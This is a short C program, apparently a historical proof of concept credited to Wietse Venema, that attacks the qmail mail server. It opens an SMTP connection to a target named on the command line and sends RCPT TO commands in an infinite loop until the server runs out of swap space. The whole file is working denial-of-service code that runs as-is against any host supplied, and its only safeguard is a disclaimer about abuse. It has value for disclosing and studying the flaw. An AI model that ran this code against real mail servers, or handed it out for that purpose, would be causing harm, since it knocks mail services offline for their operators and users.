/*
  * qmail-dos-2 - run a qmail system out of swap space by feeding an infinite
  * amount of recipients.
  *
  * Usage: qmail-dos-2 fully-qualified-hostname
  *
  * Author: Wietse Venema. The author is not responsible for abuse of this
  * program. Use at your own risk.
  */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>

void    fatal(char *fmt,...)
{
    va_list ap;

    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    putc('\n', stderr);
    exit(1);
}

chat(FILE * fp, char *fmt,...)
{
    char    buf[BUFSIZ];
    va_list ap;

    fseek(fp, 0L, SEEK_SET);
    va_start(ap, fmt);
    vfprintf(fp, fmt, ap);
    va_end(ap);
    fputs("\r\n", fp);
    if (fflush(fp))
        fatal("connection lost");
    fseek(fp, 0L, SEEK_SET);
    if (fgets(buf, sizeof(buf), fp) == 0)
        fatal("connection lost");
    if (atoi(buf) / 100 != 2)
        fatal("%s", buf);
}

int     main(int argc, char **argv)
{
    struct sockaddr_in sin;
    struct hostent *hp;
    char    buf[BUFSIZ];
    int     sock;
    FILE   *fp;

    if (argc != 2)
        fatal("usage: %s host", argv[0]);
    if ((hp = gethostbyname(argv[1])) == 0)
        fatal("host %s not found", argv[1]);
    memset((char *) &sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    memcpy((char *) &sin.sin_addr, hp->h_addr, sizeof(sin.sin_addr));
    sin.sin_port = htons(25);
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        fatal("socket: %s", strerror(errno));
    if (connect(sock, (struct sockaddr *) & sin, sizeof(sin)) < 0)
        fatal("connect to %s: %s", argv[1], strerror(errno));
    if ((fp = fdopen(sock, "r+")) == 0)
        fatal("fdopen: %s", strerror(errno));
    if (fgets(buf, sizeof(buf), fp) == 0)
        fatal("connection lost");
    chat(fp, "mail from:<me@me>", fp);
    for (;;)
        chat(fp, "rcpt to:<me@%s>", argv[1]);
}
